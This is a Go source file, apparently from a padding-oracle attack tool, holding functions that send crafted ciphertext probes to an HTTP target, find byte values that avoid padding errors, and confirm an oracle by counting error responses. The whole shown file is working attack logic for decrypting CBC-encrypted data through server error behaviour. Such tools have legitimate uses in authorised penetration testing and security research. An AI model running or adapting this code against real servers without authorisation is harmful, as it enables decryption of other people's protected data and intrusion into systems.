package probe

/* various fingerprinting of HTTP responses */

import (
	"context"
	"net/http"
)

type paddingErrorTester struct {
	fingerprints []*ResponseFingerprint
}

// detect bytes that do not produce padding error
// early-stop when maxCount of such bytes reached
func testByteValues(chunk []byte, pos int, maxCount int) ([]byte, error) {
	/* the context 	will be cancelled upon returning from function */
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	goodBytes := make([]byte, 0, maxCount)

	// probeFunc wrapper
	var probePaddingError probeFunc = func(r *http.Response, b []byte) (interface{}, error) {
		return isPaddingError(r, b)
	}

	/* call to probe */
	chanResult := sendProbes(ctx, chunk, pos, probePaddingError)

	/* output processing */
	for result := range chanResult {
		if result.err != nil {
			return nil, result.err
		}

		paddingError := result.result.(bool)
		if !paddingError {
			goodBytes = append(goodBytes, result.probe)
			// early exit of maxCount reached
			if len(goodBytes) >= maxCount {
				break
			}
		}
	}

	return goodBytes, nil
}

// convenient wrapper for single probes
func isPaddingErrorChunk(chunk []byte) (bool, error) {
	resp, body, err := doRequest(context.TODO(), chunk)
	if err != nil {
		return false, err
	}
	return isPaddingError(resp, body)
}

// confirms existence of padding oracle
// returns true if confirmed, false otherwise
func confirmPaddingOracle(blockLen int) (bool, error) {
	/* the context 	will be cancelled upon returning from function */
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// create random cipher
	cipher := randomBlock(blockLen * 2)
	pos := blockLen - 1

	// probeFunc wrapper
	var probePaddingError probeFunc = func(r *http.Response, b []byte) (interface{}, error) {
		return isPaddingError(r, b)
	}

	// send probes
	chanResult := sendProbes(ctx, cipher, pos, probePaddingError)

	// count padding errors
	count := 0
	for result := range chanResult {
		if result.err != nil {
			return false, result.err
		}
		if result.result.(bool) {
			count++
		}
	}

	// padding oracle must produce exactly 254 or 255 errors
	return count == 254 || count == 255, nil
}
